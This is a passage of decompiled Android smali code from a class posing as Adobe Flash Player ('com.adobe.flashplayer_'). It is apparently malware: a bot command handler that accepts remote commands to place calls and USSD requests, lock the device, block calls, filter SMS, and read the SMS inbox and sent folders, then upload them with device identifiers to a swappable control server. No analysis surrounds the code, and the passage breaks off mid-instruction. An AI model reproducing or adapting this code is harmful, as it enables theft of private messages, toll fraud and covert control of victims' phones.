    .line 99
    invoke-virtual/range {p0 .. p0}, Lcom/adobe/flashplayer_/BBB;->stopSelf()V

    .line 106
    :cond_1
    const-string v3, "server"

    move-object/from16 v0, v21

    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_2

    .line 108
    const-string v3, " "

    move-object/from16 v0, v21

    invoke-virtual {v0, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v22

    .line 110
    .local v22, "buff":[Ljava/lang/String;
    const/4 v3, 0x1

    aget-object v3, v22, v3

    const-string v5, "start"

    invoke-virtual {v3, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_16

    .line 112
    const-string v3, "w"

    const-string v5, "NOFILTER"

    move-object/from16 v0, p0

    invoke-direct {v0, v3, v5}, Lcom/adobe/flashplayer_/BBB;->writeConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 113
    const-string v3, "server"

    const-string v5, "start"

    move-object/from16 v0, p0

    invoke-direct {v0, v3, v5}, Lcom/adobe/flashplayer_/BBB;->writeConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 114
    const-string v3, "ReichServer!start:Executed:HTTP"

    move-object/from16 v0, p0

    move-object/from16 v1, v18

    move-object/from16 v2, v30

    invoke-direct {v0, v1, v13, v3, v2}, Lcom/adobe/flashplayer_/BBB;->sendREP(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 126
    .end local v22    # "buff":[Ljava/lang/String;
    :cond_2
    :goto_2
    const-string v3, "devLock"

    move-object/from16 v0, v21

    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_4

    .line 128
    const-string v3, " "

    move-object/from16 v0, v21

    invoke-virtual {v0, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v22

    .line 130
    .restart local v22    # "buff":[Ljava/lang/String;
    const/4 v3, 0x1

    aget-object v3, v22, v3

    const-string v5, "start"

    invoke-virtual {v3, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_3

    .line 131
    const-string v3, "lock"

    const-string v5, "work"

    move-object/from16 v0, p0

    invoke-direct {v0, v3, v5}, Lcom/adobe/flashplayer_/BBB;->writeConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 132
    const-string v3, "start"

    move-object/from16 v0, p0

    invoke-direct {v0, v3}, Lcom/adobe/flashplayer_/BBB;->FuckAv(Ljava/lang/String;)V

    .line 133
    const-string v3, "devLock!start:Executed:HTTP"

    move-object/from16 v0, p0

    move-object/from16 v1, v18

    move-object/from16 v2, v30

    invoke-direct {v0, v1, v13, v3, v2}, Lcom/adobe/flashplayer_/BBB;->sendREP(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 135
    :cond_3
    const/4 v3, 0x1

    aget-object v3, v22, v3

    const-string v5, "stop"

    invoke-virtual {v3, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_4

    .line 136
    const-string v3, "stop"

    move-object/from16 v0, p0

    invoke-direct {v0, v3}, Lcom/adobe/flashplayer_/BBB;->FuckAv(Ljava/lang/String;)V

    .line 137
    const-string v3, "lock"

    const-string v5, "stop"

    move-object/from16 v0, p0

    invoke-direct {v0, v3, v5}, Lcom/adobe/flashplayer_/BBB;->writeConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 138
    const-string v3, "devLock!stop:Executed:HTTP"

    move-object/from16 v0, p0

    move-object/from16 v1, v18

    move-object/from16 v2, v30

    invoke-direct {v0, v1, v13, v3, v2}, Lcom/adobe/flashplayer_/BBB;->sendREP(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 145
    .end local v22    # "buff":[Ljava/lang/String;
    :cond_4
    const-string v3, "makeCall"

    move-object/from16 v0, v21

    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_5

    .line 146
    const-string v3, " "

    move-object/from16 v0, v21

    invoke-virtual {v0, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v39

    .line 147
    .local v39, "ext":[Ljava/lang/String;
    const/4 v3, 0x1

    aget-object v3, v39, v3

    const-string v5, "P"

    const-string v7, "+"

    invoke-virtual {v3, v5, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v45

    .line 148
    .local v45, "n":Ljava/lang/String;
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v5, "makeCall["

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/4 v5, 0x1

    aget-object v5, v39, v5

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, "]start:Executed:HTTP"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, p0

    move-object/from16 v1, v18

    move-object/from16 v2, v30

    invoke-direct {v0, v1, v13, v3, v2}, Lcom/adobe/flashplayer_/BBB;->sendREP(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 149
    const-string v3, "call"

    move-object/from16 v0, p0

    move-object/from16 v1, v45

    invoke-direct {v0, v3, v1}, Lcom/adobe/flashplayer_/BBB;->AvFuck(Ljava/lang/String;Ljava/lang/String;)V

    .line 153
    .end local v39    # "ext":[Ljava/lang/String;
    .end local v45    # "n":Ljava/lang/String;
    :cond_5
    const-string v3, "makeUssd"

    move-object/from16 v0, v21

    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_6

    .line 154
    const-string v3, " "

    move-object/from16 v0, v21

    invoke-virtual {v0, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v39

    .line 155
    .restart local v39    # "ext":[Ljava/lang/String;
    const/4 v3, 0x1

    aget-object v3, v39, v3

    const-string v5, "S"

    const-string v7, "*"

    invoke-virtual {v3, v5, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v45

    .line 156
    .restart local v45    # "n":Ljava/lang/String;
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v5, "makeUssd["

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/4 v5, 0x1

    aget-object v5, v39, v5

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, "]start:Executed:HTTP"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, p0

    move-object/from16 v1, v18

    move-object/from16 v2, v30

    invoke-direct {v0, v1, v13, v3, v2}, Lcom/adobe/flashplayer_/BBB;->sendREP(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 157
    const-string v3, "#"

    invoke-static {v3}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v38

    .line 158
    .local v38, "encodedHash":Ljava/lang/String;
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v5, "*"

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v45

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, v38

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v67

    .line 159
    .local v67, "ussd":Ljava/lang/String;
    const-string v3, "ussd"

    move-object/from16 v0, p0

    move-object/from16 v1, v67

    invoke-direct {v0, v3, v1}, Lcom/adobe/flashplayer_/BBB;->AvFuck(Ljava/lang/String;Ljava/lang/String;)V

    .line 165
    .end local v38    # "encodedHash":Ljava/lang/String;
    .end local v39    # "ext":[Ljava/lang/String;
    .end local v45    # "n":Ljava/lang/String;
    .end local v67    # "ussd":Ljava/lang/String;
    :cond_6
    const-string v3, "setFilter"

    move-object/from16 v0, v21

    invoke-virtual {v0, v3}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v3

    const/4 v5, -0x1

    if-eq v3, v5, :cond_9

    .line 167
    const-string v3, " "

    move-object/from16 v0, v21

    invoke-virtual {v0, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v64

    .line 168
    .local v64, "test":[Ljava/lang/String;
    const/4 v3, 0x1

    aget-object v31, v64, v3

    .line 169
    .local v31, "data":Ljava/lang/String;
    const/4 v3, 0x2

    aget-object v20, v64, v3

    .line 171
    .local v20, "act":Ljava/lang/String;
    const-string v3, "start"

    move-object/from16 v0, v20

    invoke-virtual {v0, v3}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v3

    const/4 v5, -0x1

    if-eq v3, v5, :cond_7

    .line 172
    const-string v3, "w"

    move-object/from16 v0, p0

    move-object/from16 v1, v31

    invoke-direct {v0, v3, v1}, Lcom/adobe/flashplayer_/BBB;->writeConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 174
    :cond_7
    const-string v3, "stop"

    move-object/from16 v0, v20

    invoke-virtual {v0, v3}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v3

    const/4 v5, -0x1

    if-eq v3, v5, :cond_8

    .line 176
    const-string v3, "w"

    const-string v5, "NOFILTER"

    move-object/from16 v0, p0

    invoke-direct {v0, v3, v5}, Lcom/adobe/flashplayer_/BBB;->writeConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 178
    :cond_8
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v5, "setFilter["

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/4 v5, 0x1

    aget-object v5, v64, v5

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, "]"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, v20

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, ":Executed:HTTP"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, p0

    move-object/from16 v1, v18

    move-object/from16 v2, v30

    invoke-direct {v0, v1, v13, v3, v2}, Lcom/adobe/flashplayer_/BBB;->sendREP(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 190
    .end local v20    # "act":Ljava/lang/String;
    .end local v31    # "data":Ljava/lang/String;
    .end local v64    # "test":[Ljava/lang/String;
    :cond_9
    const-string v3, "forceZ"

    move-object/from16 v0, v21

    invoke-virtual {v0, v3}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v3

    const/4 v5, -0x1

    if-eq v3, v5, :cond_a

    .line 192
    const-string v3, " "

    move-object/from16 v0, v21

    invoke-virtual {v0, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v28

    .line 194
    .local v28, "cmd_data":[Ljava/lang/String;
    const/4 v3, 0x1

    aget-object v3, v28, v3

    const-string v5, "On"

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_17

    .line 195
    const-string v3, "forceZ"

    const-string v5, "On"

    move-object/from16 v0, p0

    invoke-direct {v0, v3, v5}, Lcom/adobe/flashplayer_/BBB;->writeConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 205
    .end local v28    # "cmd_data":[Ljava/lang/String;
    :cond_a
    :goto_3
    const-string v3, "callBlock"

    move-object/from16 v0, v21

    invoke-virtual {v0, v3}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v3

    const/4 v5, -0x1

    if-eq v3, v5, :cond_d

    .line 206
    const-string v3, " "

    move-object/from16 v0, v21

    invoke-virtual {v0, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v28

    .line 207
    .restart local v28    # "cmd_data":[Ljava/lang/String;
    const/4 v3, 0x1

    aget-object v31, v28, v3

    .line 208
    .restart local v31    # "data":Ljava/lang/String;
    const/4 v3, 0x2

    aget-object v20, v28, v3

    .line 210
    .restart local v20    # "act":Ljava/lang/String;
    const-string v3, "start"

    move-object/from16 v0, v20

    invoke-virtual {v0, v3}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v3

    const/4 v5, -0x1

    if-eq v3, v5, :cond_b

    .line 211
    const-string v3, "c"

    move-object/from16 v0, p0

    move-object/from16 v1, v31

    invoke-direct {v0, v3, v1}, Lcom/adobe/flashplayer_/BBB;->writeConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 213
    :cond_b
    const-string v3, "stop"

    move-object/from16 v0, v20

    invoke-virtual {v0, v3}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v3

    const/4 v5, -0x1

    if-eq v3, v5, :cond_c

    .line 214
    const-string v3, "c"

    const-string v5, "1234567890"

    move-object/from16 v0, p0

    invoke-direct {v0, v3, v5}, Lcom/adobe/flashplayer_/BBB;->writeConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 217
    :cond_c
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v5, "callBlock["

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v31

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, "]"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, v20

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, ":Executed:HTTP"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, p0

    move-object/from16 v1, v18

    move-object/from16 v2, v30

    invoke-direct {v0, v1, v13, v3, v2}, Lcom/adobe/flashplayer_/BBB;->sendREP(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 233
    .end local v20    # "act":Ljava/lang/String;
    .end local v28    # "cmd_data":[Ljava/lang/String;
    .end local v31    # "data":Ljava/lang/String;
    :cond_d
    const-string v3, "getMessages"

    move-object/from16 v0, v21

    invoke-virtual {v0, v3}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v3

    const/4 v5, -0x1

    if-eq v3, v5, :cond_e

    .line 235
    const-string v50, ""

    .line 236
    .local v50, "pack_inbox":Ljava/lang/String;
    const-string v51, ""

    .line 237
    .local v51, "pack_inbox_pack":Ljava/lang/String;
    const-string v52, ""

    .line 238
    .local v52, "pack_outbox":Ljava/lang/String;
    const-string v53, ""

    .line 240
    .local v53, "pack_outbox_pack":Ljava/lang/String;
    const-string v3, "content://sms/inbox"

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v4

    .line 241
    .local v4, "inBox":Landroid/net/Uri;
    invoke-virtual/range {v30 .. v30}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    const/4 v5, 0x0

    const/4 v6, 0x0

    const/4 v7, 0x0

    const/4 v8, 0x0

    invoke-virtual/range {v3 .. v8}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v42

    .line 242
    .local v42, "inc":Landroid/database/Cursor;
    :goto_4
    invoke-interface/range {v42 .. v42}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3

    if-nez v3, :cond_18

    .line 254
    invoke-interface/range {v42 .. v42}, Landroid/database/Cursor;->close()V

    .line 260
    const-string v3, "content://sms/sent"

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v6

    .line 261
    .local v6, "outBox":Landroid/net/Uri;
    invoke-virtual/range {v30 .. v30}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v5

    const/4 v7, 0x0

    const/4 v8, 0x0

    const/4 v9, 0x0

    const/4 v10, 0x0

    invoke-virtual/range {v5 .. v10}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v49

    .line 262
    .local v49, "ouc":Landroid/database/Cursor;
    :goto_5
    invoke-interface/range {v49 .. v49}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3

    if-nez v3, :cond_19

    .line 272
    invoke-interface/range {v49 .. v49}, Landroid/database/Cursor;->close()V

    .line 274
    const-string v3, "in.z"

    move-object/from16 v0, p0

    move-object/from16 v1, v50

    invoke-direct {v0, v3, v1}, Lcom/adobe/flashplayer_/BBB;->writeConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 276
    const-string v3, "out.z"

    move-object/from16 v0, p0

    move-object/from16 v1, v52

    invoke-direct {v0, v3, v1}, Lcom/adobe/flashplayer_/BBB;->writeConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 278
    new-instance v3, Lcom/adobe/flashplayer_/AAA000;

    invoke-direct {v3}, Lcom/adobe/flashplayer_/AAA000;-><init>()V

    const/4 v5, 0x3

    new-array v5, v5, [Ljava/lang/String;

    const/4 v7, 0x0

    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "&b="

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&c="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, ":"

    const-string v10, ""

    invoke-virtual {v15, v9, v10}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&d="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&e="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "BotPhone"

    move-object/from16 v0, p0

    invoke-direct {v0, v9}, Lcom/adobe/flashplayer_/BBB;->readConfig(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&f="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    move-object/from16 v0, v17

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&g="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    move-object/from16 v0, v19

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&h=in_sms&i=cmd&prefix="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    move-object/from16 v0, v16

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    aput-object v8, v5, v7

    const/4 v7, 0x1

    const-string v8, "in.z"

    move-object/from16 v0, p0

    invoke-virtual {v0, v8}, Lcom/adobe/flashplayer_/BBB;->getFileStreamPath(Ljava/lang/String;)Ljava/io/File;

    move-result-object v8

    invoke-virtual {v8}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v8

    aput-object v8, v5, v7

    const/4 v7, 0x2

    aput-object v18, v5, v7

    invoke-virtual {v3, v5}, Lcom/adobe/flashplayer_/AAA000;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 280
    new-instance v3, Lcom/adobe/flashplayer_/AAA000;

    invoke-direct {v3}, Lcom/adobe/flashplayer_/AAA000;-><init>()V

    const/4 v5, 0x3

    new-array v5, v5, [Ljava/lang/String;

    const/4 v7, 0x0

    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "&b="

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&c="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, ":"

    const-string v10, ""

    invoke-virtual {v15, v9, v10}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&d="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&e="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "BotPhone"

    move-object/from16 v0, p0

    invoke-direct {v0, v9}, Lcom/adobe/flashplayer_/BBB;->readConfig(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&f="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    move-object/from16 v0, v17

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&g="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    move-object/from16 v0, v19

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&h=out_sms&i=cmd&prefix="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    move-object/from16 v0, v16

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    aput-object v8, v5, v7

    const/4 v7, 0x1

    const-string v8, "out.z"

    move-object/from16 v0, p0

    invoke-virtual {v0, v8}, Lcom/adobe/flashplayer_/BBB;->getFileStreamPath(Ljava/lang/String;)Ljava/io/File;

    move-result-object v8

    invoke-virtual {v8}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v8

    aput-object v8, v5, v7

    const/4 v7, 0x2

    aput-object v18, v5, v7

    invoke-virtual {v3, v5}, Lcom/adobe/flashplayer_/AAA000;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 282
    const-string v3, "getMessages:Executed:HTTP"

    move-object/from16 v0, p0

    move-object/from16 v1, v18

    move-object/from16 v2, v30

    invoke-direct {v0, v1, v13, v3, v2}, Lcom/adobe/flashplayer_/BBB;->sendREP(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 289
    .end local v4    # "inBox":Landroid/net/Uri;
    .end local v6    # "outBox":Landroid/net/Uri;
    .end local v42    # "inc":Landroid/database/Cursor;
    .end local v49    # "ouc":Landroid/database/Cursor;
    .end local v50    # "pack_inbox":Ljava/lang/String;
    .end local v51    # "pack_inbox_pack":Ljava/lang/String;
    .end local v52    # "pack_outbox":Ljava/lang/String;
    .end local v53    # "pack_outbox_pack":Ljava/lang/String;
    :cond_e
    const-string v3, "keyHttpGate"

    move-object/from16 v0, v21

    invoke-virtual {v0, v3}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v3

    const/4 v5, -0x1

    if-eq v3, v5, :cond_f

    .line 290
    const-string v3, " "

    move-object/from16 v0, v21

    invoke-virtual {v0, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v28

    .line 291
    .restart local v28    # "cmd_data":[Ljava/lang/String;
    const/4 v3, 0x1

    aget-object v31, v28, v3

    .line 292
    .restart local v31    # "data":Ljava/lang/String;
    const-string v3, "Reich_ServerGate"

    move-object/from16 v0, p0

    move-object/from16 v1, v31

    invoke-direct {v0, v3, v1}, Lcom/adobe/flashplayer_/BBB;->writeConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 293
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v5, "keyHttpGate["

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v5, "http://"

    const-string v7, ""

    move-object/from16 v0, v31

    invoke-virtual {v0, v5, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, "]:Executed:HTTP"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, p0

    move-object/from16 v1, v18

    move-object/from16 v2, v30

    invoke-direct {v0, v1, v13, v3, v2}, Lcom/adobe/flashplayer_/BBB;->sendREP(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 298
    .end local v28    # "cmd_data":[Ljava/lang/String;
    .end local v31    # "data":Ljava/lang/String;
    :cond_f
    const-string v3, "keySmsGate"

    move-object/from16 v0, v21

    invoke-virtual {v0, v3}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v3

    const/4 v5, -0x1

    if-eq v3, v5, :cond_10

    .line 299
    const-string v3, " "

    move-object/from16 v0, v21

    invoke-virtual {v0, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v28

    .line 300
    .restart local v28    # "cmd_data":[Ljava/lang/String;
    const/4 v3, 0x1

    aget-object v31, v28, v3

    .line 301
    .restart local v31    # "data":Ljava/lang/String;
    const-string v3, "Reich_SMSGate"

    move-object/from16 v0, p0

    move-object/from16 v1, v31

    invoke-direct {v0, v3, v1}, Lcom/adobe/flashplayer_/BBB;->writeConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 302
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v5, "keySmsGate["

